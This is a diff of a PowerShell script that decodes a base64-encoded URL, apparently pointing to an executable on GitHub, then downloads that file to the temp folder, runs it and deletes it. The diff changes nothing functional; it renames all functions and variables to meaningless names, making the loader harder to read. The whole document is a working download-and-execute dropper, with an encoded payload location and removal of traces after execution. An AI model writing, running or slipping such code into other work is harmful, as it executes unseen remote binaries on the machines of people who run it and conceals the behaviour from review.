@@ -1,95 +1,95 @@
-function Get-RndChr {
+function f1 {
     param (
-        [int]$l
+        [int]$v1
     )
-    return -join ((65..90) | Get-Random -Count $l | ForEach-Object { [char]$_ })
+    return -join ((65..90) | Get-Random -Count $v1 | ForEach-Object { [char]$_ })
 }
 
-$encUrl = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"
+$e1 = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"
 
-function Dec-B64 {
+function f2 {
     param (
-        [string]$encStr
+        [string]$v2
     )
     try {
-        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encStr))
+        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($v2))
     } catch {
         Write-Error "Failed : $_"
         return $null
     }
 }
 
-$decUrl = Dec-B64 -encStr $encUrl
+$d1 = f2 -v2 $e1
 
-function Dwn-Fl {
+function f3 {
     param (
-        [string]$url
+        [string]$v3
     )
     try {
-        $output = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($url))
-        $client = New-Object System.Net.WebClient
-        $client.DownloadFile($url, $output)
-        return $output
+        $o1 = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($v3))
+        $c1 = New-Object System.Net.WebClient
+        $c1.DownloadFile($v3, $o1)
+        return $o1
     } catch {
         Write-Error "Failed : $_"
         return $null
     }
 }
 
-function Exe-Fl {
+function f4 {
     param (
-        [string]$filePath
+        [string]$v4
     )
     try {
-        Start-Process -FilePath $filePath -NoNewWindow -Wait
+        Start-Process -FilePath $v4 -NoNewWindow -Wait
     } catch {
         Write-Error "Failed : $_"
     }
 }
 
-function Shft-Chr {
+function f5 {
     param (
-        [string]$inputStr,
-        [int]$shft
+        [string]$v5,
+        [int]$s1
     )
     try {
-        $result = ""
-        foreach ($chr in $inputStr.ToCharArray()) {
-            $result += [char](([byte]$chr + $shft) -band 0xFF)
+        $r1 = ""
+        foreach ($c1 in $v5.ToCharArray()) {
+            $r1 += [char](([byte]$c1 + $s1) -band 0xFF)
         }
-        return $result
+        return $r1
     } catch {
         Write-Error "Failed : $_"
         return $null
     }
 }
 
-function Xor-Chr {
+function f6 {
     param (
-        [string]$inputStr,
-        [int]$key
+        [string]$v6,
+        [int]$k1
     )
     try {
-        $result = ""
-        foreach ($chr in $inputStr.ToCharArray()) {
-            $result += [char](([byte]$chr -bxor $key) -band 0xFF)
+        $r2 = ""
+        foreach ($c2 in $v6.ToCharArray()) {
+            $r2 += [char](([byte]$c2 -bxor $k1) -band 0xFF)
         }
-        return $result
+        return $r2
     } catch {
         Write-Error "Failed : $_"
         return $null
     }
 }
 
-$obfUrl = Shft-Chr -inputStr $decUrl -shft 1
-$obfUrl = Xor-Chr -inputStr $obfUrl -key 5
+$o2 = f5 -v5 $d1 -s1 1
+$o2 = f6 -v6 $o2 -k1 5
 
-$deObfUrl = Xor-Chr -inputStr $obfUrl -key 5
-$deObfUrl = Shft-Chr -inputStr $deObfUrl -shft -1
+$d2 = f6 -v6 $o2 -k1 5
+$d2 = f5 -v5 $d2 -s1 -1
 
-$flPath = Dwn-Fl -url $deObfUrl
+$p1 = f3 -v3 $d2
 
-if ($flPath) {
-    Exe-Fl -filePath $flPath
-    Remove-Item -Path $flPath
+if ($p1) {
+    f4 -v4 $p1
+    Remove-Item -Path $p1
 }
